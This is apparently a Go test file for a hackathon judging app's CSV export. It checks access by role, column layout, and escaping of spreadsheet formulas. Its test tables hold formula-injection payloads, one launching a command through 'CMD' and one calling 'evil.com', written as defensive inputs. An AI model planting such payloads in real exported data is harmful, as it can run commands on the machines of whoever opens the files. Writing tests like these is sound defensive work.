package httpapp

import (
	"encoding/csv"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// TestSanitizeCSVField_F21 tests Failure Case F21: Spreadsheet Formula Injection defense.
func TestSanitizeCSVField_F21(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{"empty string", "", ""},
		{"plain text", "Quantum AI Optimizer", "Quantum AI Optimizer"},
		{"text with comma", "AI, Machine Learning", "AI, Machine Learning"},
		{"text with quotes", `The "Best" Project`, `The "Best" Project`},
		{"formula equals command", "=CMD|' /C calc'!A0", "'=CMD|' /C calc'!A0"},
		{"formula equals sum", "=SUM(A1:A10)", "'=SUM(A1:A10)"},
		{"formula plus prefix", "+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"},
		{"formula minus expr", "-2+5", "'-2+5"},
		{"formula at prefix", "@IMPORT(\"http://evil.com\")", "'@IMPORT(\"http://evil.com\")"},
		{"formula leading tab", "\t=1+1", "'\t=1+1"},
		{"formula leading carriage return", "\r+calc", "'\r+calc"},
		{"formula leading spaces with equals", "   =SUM(1,2)", "'   =SUM(1,2)"},
		{"legitimate negative integer", "-42", "-42"},
		{"legitimate negative float", "-3.1415", "-3.1415"},
		{"legitimate positive integer with plus", "+100", "+100"},
		{"legitimate zero", "0", "0"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			actual := sanitizeCSVField(tc.input)
			if actual != tc.expected {
				t.Errorf("input %q: expected %q, got %q", tc.input, tc.expected, actual)
			}
		})
	}
}

// TestCSVExport_AuthorizationAndFormat verifies role enforcement, Content-Type, Content-Disposition, and RFC 4180 parsing.
func TestCSVExport_AuthorizationAndFormat(t *testing.T) {
	db := setupSeededDB(t)
	server, err := NewServer(Config{Port: 8080, DB: db})
	if err != nil {
		t.Fatalf("NewServer: %v", err)
	}
	handler := server.Handler()

	// 1. Anonymous access is rejected with 401 Unauthorized
	for _, path := range []string{"/api/export.csv", "/api/v1/export.csv", "/api/export/results.csv", "/api/export/evaluations.csv"} {
		req := httptest.NewRequest(http.MethodGet, path, nil)
		rr := httptest.NewRecorder()
		handler.ServeHTTP(rr, req)
		if rr.Code != http.StatusUnauthorized {
			t.Errorf("%s: anonymous expected 401, got %d", path, rr.Code)
		}
	}

	// 2. Participant access is rejected with 403 Forbidden
	for _, path := range []string{"/api/export.csv", "/api/v1/export.csv", "/api/export/results.csv", "/api/export/evaluations.csv"} {
		req := httptest.NewRequest(http.MethodGet, path, nil)
		req.Header.Set("Authorization", "Bearer prt_2e88")
		rr := httptest.NewRecorder()
		handler.ServeHTTP(rr, req)
		if rr.Code != http.StatusForbidden {
			t.Errorf("%s: participant expected 403, got %d", path, rr.Code)
		}
	}

	// 3. Judge access is rejected with 403 Forbidden
	for _, path := range []string{"/api/export.csv", "/api/v1/export.csv"} {
		req := httptest.NewRequest(http.MethodGet, path, nil)
		req.Header.Set("Authorization", "Bearer jdg_a_91bc")
		rr := httptest.NewRecorder()
		handler.ServeHTTP(rr, req)
		if rr.Code != http.StatusForbidden {
			t.Errorf("%s: judge expected 403, got %d", path, rr.Code)
		}
	}

	// 4. Organizer access succeeds with 200 OK and text/csv
	reqOrg := httptest.NewRequest(http.MethodGet, "/api/export.csv", nil)
	reqOrg.Header.Set("Authorization", "Bearer org_7f2a")
	rrOrg := httptest.NewRecorder()
	handler.ServeHTTP(rrOrg, reqOrg)

	if rrOrg.Code != http.StatusOK {
		t.Fatalf("organizer export: expected 200, got %d: %s", rrOrg.Code, rrOrg.Body.String())
	}
	contentType := rrOrg.Header().Get("Content-Type")
	if !strings.HasPrefix(contentType, "text/csv") {
		t.Errorf("expected Content-Type text/csv, got %q", contentType)
	}
	contentDisp := rrOrg.Header().Get("Content-Disposition")
	if !strings.Contains(contentDisp, "attachment") || !strings.Contains(contentDisp, ".csv") {
		t.Errorf("expected Content-Disposition attachment, got %q", contentDisp)
	}

	// 5. Official acceptance check compatibility: first line has a comma
	bodyStr := rrOrg.Body.String()
	lines := strings.Split(bodyStr, "\n")
	if len(lines) == 0 || !strings.Contains(lines[0], ",") {
		t.Fatalf("first line must contain a comma, got: %q", bodyStr)
	}

	// 6. RFC 4180 parser round-trip
	reader := csv.NewReader(strings.NewReader(bodyStr))
	records, err := reader.ReadAll()
	if err != nil {
		t.Fatalf("RFC 4180 parsing failed: %v", err)
	}
	if len(records) < 2 {
		t.Fatalf("expected at least header and one data row, got %d rows", len(records))
	}
}

// TestCSVExport_Evaluations verifies the evaluations / ballots export.
func TestCSVExport_Evaluations(t *testing.T) {
	db := setupSeededDB(t)
	server, err := NewServer(Config{Port: 8080, DB: db})
	if err != nil {
		t.Fatalf("NewServer: %v", err)
	}
	handler := server.Handler()

	req := httptest.NewRequest(http.MethodGet, "/api/v1/export/evaluations.csv", nil)
	req.Header.Set("Authorization", "Bearer org_7f2a")
	rr := httptest.NewRecorder()
	handler.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("evaluations export: expected 200, got %d", rr.Code)
	}
	bodyStr := rr.Body.String()
	reader := csv.NewReader(strings.NewReader(bodyStr))
	records, err := reader.ReadAll()
	if err != nil {
		t.Fatalf("evaluations CSV parse failed: %v", err)
	}
	if len(records) == 0 {
		t.Fatalf("expected non-empty records")
	}
	header := records[0]
	expectedCols := []string{"assignment_id", "ballot_id", "project_id", "project_title", "judge_user_id", "judge_name", "rubric_version_id", "save_kind", "scores", "comment", "created_at"}
	if len(header) != len(expectedCols) {
		t.Fatalf("expected %d columns, got %d: %v", len(expectedCols), len(header), header)
	}
	for i, col := range expectedCols {
		if header[i] != col {
			t.Errorf("column %d: expected %q, got %q", i, col, header[i])
		}
	}
}

// TestCSVExport_ResultsPublishedWithFormulaSanitization verifies results export with computed standings and formula payload sanitization.
func TestCSVExport_ResultsPublishedWithFormulaSanitization(t *testing.T) {
	db := setupSeededDB(t)
	server, err := NewServer(Config{Port: 8080, DB: db})
	if err != nil {
		t.Fatalf("NewServer: %v", err)
	}
	handler := server.Handler()

	// Inject a project with a spreadsheet formula payload in title to verify Failure Case F21 defense
	_, err = db.Exec(`
		UPDATE submissions
		SET title = '=CMD|'' /C calc''!A0'
		WHERE project_id = 'prj_01' AND version_no = (SELECT MAX(version_no) FROM submissions WHERE project_id = 'prj_01');
	`)
	if err != nil {
		t.Fatalf("failed to update submission title with formula: %v", err)
	}

	// 1. Run assignments
	reqRun := httptest.NewRequest(http.MethodPost, "/api/v1/organizer/assignments/run", nil)
	reqRun.Header.Set("Authorization", "Bearer org_7f2a")
	rrRun := httptest.NewRecorder()
	handler.ServeHTTP(rrRun, reqRun)

	// 2. Submit ballot as judge_a for an active assignment
	var asgnID string
	_ = db.QueryRow("SELECT id FROM assignments WHERE judge_user_id = 'jdg_01' LIMIT 1;").Scan(&asgnID)
	if asgnID != "" {
		scoresBody := `{"scores":{"crit_1":5.0,"crit_2":4.0},"comment":"Excellent, innovative work! Highly recommended."}`
		reqBallot := httptest.NewRequest(http.MethodPost, "/api/v1/assignments/"+asgnID+"/ballot/submit", strings.NewReader(scoresBody))
		reqBallot.Header.Set("Authorization", "Bearer jdg_a_91bc")
		reqBallot.Header.Set("Content-Type", "application/json")
		rrBallot := httptest.NewRecorder()
		handler.ServeHTTP(rrBallot, reqBallot)
	}

	// 3. Compute and publish results
	reqCompute := httptest.NewRequest(http.MethodPost, "/api/v1/organizer/results/compute", nil)
	reqCompute.Header.Set("Authorization", "Bearer org_7f2a")
	rrCompute := httptest.NewRecorder()
	handler.ServeHTTP(rrCompute, reqCompute)
	if rrCompute.Code != http.StatusOK {
		t.Fatalf("compute results: expected 200, got %d: %s", rrCompute.Code, rrCompute.Body.String())
	}
	var compRun struct {
		ID string `json:"id"`
	}
	_ = json.NewDecoder(rrCompute.Body).Decode(&compRun)

	reqPublish := httptest.NewRequest(http.MethodPost, "/api/v1/organizer/results/"+compRun.ID+"/publish", nil)
	reqPublish.Header.Set("Authorization", "Bearer org_7f2a")
	rrPublish := httptest.NewRecorder()
	handler.ServeHTTP(rrPublish, reqPublish)
	if rrPublish.Code != http.StatusOK {
		t.Fatalf("publish results: expected 200, got %d", rrPublish.Code)
	}

	// 4. Export CSV as Organizer via /api/v1/export.csv
	reqCSV := httptest.NewRequest(http.MethodGet, "/api/v1/export.csv", nil)
	reqCSV.Header.Set("Authorization", "Bearer org_7f2a")
	rrCSV := httptest.NewRecorder()
	handler.ServeHTTP(rrCSV, reqCSV)

	if rrCSV.Code != http.StatusOK {
		t.Fatalf("export CSV: expected 200, got %d: %s", rrCSV.Code, rrCSV.Body.String())
	}

	bodyStr := rrCSV.Body.String()
	reader := csv.NewReader(strings.NewReader(bodyStr))
	records, err := reader.ReadAll()
	if err != nil {
		t.Fatalf("failed to parse exported results CSV: %v", err)
	}

	// Verify header has 17 stable columns
	expectedHeader := []string{
		"rank", "project_id", "title", "team_id", "team_name", "track_id", "track_name",
		"final_score", "raw_score", "expected_reviews", "completed_reviews", "effective_reviews",
		"fallback_count", "tie_group", "result_run_id", "input_digest", "published_at",
	}
	header := records[0]
	if len(header) != len(expectedHeader) {
		t.Fatalf("expected %d columns in header, got %d", len(expectedHeader), len(header))
	}
	for i, col := range expectedHeader {
		if header[i] != col {
			t.Errorf("header col %d: expected %q, got %q", i, col, header[i])
		}
	}

	// Verify formula injection sanitization: prj_01 title must be prefixed with single quote (')
	foundProj1 := false
	for _, row := range records[1:] {
		if row[1] == "prj_01" {
			foundProj1 = true
			if !strings.HasPrefix(row[2], "'=") {
				t.Errorf("prj_01 title should be safely escaped with leading single quote, got: %q", row[2])
			}
			// Verify stable IDs match
			if row[14] != compRun.ID {
				t.Errorf("result_run_id mismatch: expected %s, got %s", compRun.ID, row[14])
			}
		}
	}
	if !foundProj1 {
		t.Errorf("prj_01 not found in exported results CSV")
	}
}

// TestAPIFirst_Consistency tests that /api/v1/... endpoints match /api/... endpoints with unified logic.
func TestAPIFirst_Consistency(t *testing.T) {
	db := setupSeededDB(t)
	server, err := NewServer(Config{Port: 8080, DB: db})
	if err != nil {
		t.Fatalf("NewServer: %v", err)
	}
	handler := server.Handler()

	endpoints := []struct {
		v1Path  string
		legacy  string
		authTok string
	}{
		{"/api/v1/projects", "/api/projects", ""},
		{"/api/v1/teams", "/api/teams", ""},
		{"/api/v1/tracks", "/api/tracks", ""},
		{"/api/v1/prizes", "/api/prizes", ""},
		{"/api/v1/judge/scores", "/api/judge/scores", "jdg_a_91bc"},
		{"/api/v1/results", "/api/results", ""},
	}

	for _, ep := range endpoints {
		t.Run(ep.v1Path, func(t *testing.T) {
			reqV1 := httptest.NewRequest(http.MethodGet, ep.v1Path, nil)
			if ep.authTok != "" {
				reqV1.Header.Set("Authorization", "Bearer "+ep.authTok)
			}
			rrV1 := httptest.NewRecorder()
			handler.ServeHTTP(rrV1, reqV1)

			reqLegacy := httptest.NewRequest(http.MethodGet, ep.legacy, nil)
			if ep.authTok != "" {
				reqLegacy.Header.Set("Authorization", "Bearer "+ep.authTok)
			}
			rrLegacy := httptest.NewRecorder()
			handler.ServeHTTP(rrLegacy, reqLegacy)

			if rrV1.Code != rrLegacy.Code {
				t.Errorf("status code mismatch: v1 got %d, legacy got %d", rrV1.Code, rrLegacy.Code)
			}
			if rrV1.Body.String() != rrLegacy.Body.String() {
				t.Errorf("body content mismatch between %s and %s", ep.v1Path, ep.legacy)
			}
		})
	}
}
